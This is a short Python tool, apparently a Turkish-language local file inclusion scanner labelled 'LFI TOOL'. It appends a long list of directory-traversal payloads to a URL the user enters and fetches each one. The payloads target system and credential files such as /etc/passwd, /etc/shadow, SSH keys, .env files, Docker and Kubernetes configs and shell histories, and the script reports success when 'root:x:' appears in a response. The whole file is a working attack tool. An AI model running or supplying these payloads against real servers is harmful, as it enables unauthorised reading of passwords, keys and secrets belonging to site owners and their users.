import requests
from colorama import Fore, Style, init

# Display the ASCII art when the script runs
print(Fore.GREEN + """

 __       ______   ________      _________  ______   ______   __          
/_/\     /_____/\ /_______/\    /________/\/_____/\ /_____/\ /_/\         
\:\ \    \::::_\/_\__.::._\/    \__.::.__\/\:::_ \ \\:::_ \ \\:\ \        
 \:\ \    \:\/___/\  \::\ \        \::\ \   \:\ \ \ \\:\ \ \ \\:\ \       
  \:\ \____\:::._\/  _\::\ \__      \::\ \   \:\ \ \ \\:\ \ \ \\:\ \____  
   \:\/___/\\:\ \   /__\::\__/\      \::\ \   \:\_\ \ \\:\_\ \ \\:\/___/\ 
    \_____\/ \_\/   \________\/       \__\/    \_____\/ \_____\/ \_____\/ 
                                                                          

""")

url = input("Test için URL giriniz: ")

payloads = [
    "../../../../etc/passwd", 
    "../../../../etc/shadow", 
    "../../../../var/log/apache2/access.log", 
    "../../../../var/log/apache2/error.log", 
    "../../../../var/www/html/config.php", 
    "../../../../var/www/html/index.php", 
    "../../../../var/www/html/db_config.php", 
    "../../../../var/www/html/.htaccess", 
    "../../../../etc/hostname", 
    "../../../../etc/hosts", 
    "../../../../proc/self/environ", 
    "../../../../proc/self/cmdline", 
    "../../../../proc/self/status", 
    "../../../../var/log/syslog", 
    "../../../../var/log/messages", 
    "../../../../etc/apache2/apache2.conf", 
    "../../../../etc/nginx/nginx.conf", 
    "../../../../etc/mysql/my.cnf", 
    "../../../../etc/ssh/sshd_config", 
    "../../../../var/lib/mysql/mysql.sock", 
    "../../../../var/run/mysqld/mysqld.sock", 
    "../../../../var/www/.htpasswd", 
    "../../../../etc/cron.d", 
    "../../../../var/spool/cron/crontabs", 
    "../../../../etc/ssl/certs/ca-certificates.crt", 
    "../../../../var/cache/apt/archives", 
    "../../../../var/www/html/.git", 
    "../../../../var/www/html/.svn",
    "../../../../home/user/.bashrc", 
    "../../../../var/www/html/.git", 
    "../../../../var/www/html/.idea", 
    "../../../../var/www/html/.env", 
    "../../../../var/www/html/.bash_history", 
    "../../../../var/www/html/.htpasswd", 
    "../../../../var/www/html/.htaccess", 
    "../../../../var/www/html/.DS_Store", 
    "../../../../var/www/html/.vscode", 
    "../../../../var/www/html/.gitconfig", 
    "../../../../var/www/html/.npmrc", 
    "../../../../var/www/html/.dockerignore", 
    "../../../../var/www/html/.gitmodules", 
    "../../../../var/www/html/.bashrc", 
    "../../../../var/www/html/.zshrc", 
    "../../../../var/www/html/.viminfo", 
    "../../../../var/www/html/.ssh/authorized_keys", 
    "../../../../var/www/html/.bash_profile", 
    "../../../../var/www/html/.profile", 
    "../../../../var/www/html/.python_history", 
    "../../../../var/www/html/.mysql_history", 
    "../../../../var/www/html/.composer", 
    "../../../../var/www/html/.php_history", 
    "../../../../var/www/html/.emacs.d", 
    "../../../../var/www/html/.ruby_history", 
    "../../../../var/www/html/.docker/config.json", 
    "../../../../var/www/html/.kube/config", 
    "../../../../var/www/html/.m2/settings.xml", 
    "../../../../var/www/html/.gradle/gradle.properties", 
    "../../../../var/www/html/.ssh/config"
]

for payl in payloads:
    url_test = url + payl
    try:
        response = requests.get(url_test)

        # Durum kodu kontrolü
        if response.status_code == 200:
            print(f"[+] Başarılı İstek: {url_test}")
        else:
            print(f"[-] Hata: {url_test} - Durum Kodu: {response.status_code}")

        # Yanıtı daha detaylı inceleyin
        if "root:x:" in response.text:
            print(f"[+] LFI Başarılı: {url_test}")
        else:
            print(f"[--] LFI bulunamadı: {url_test}")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Hata oluştu: {url_test} - {e}")
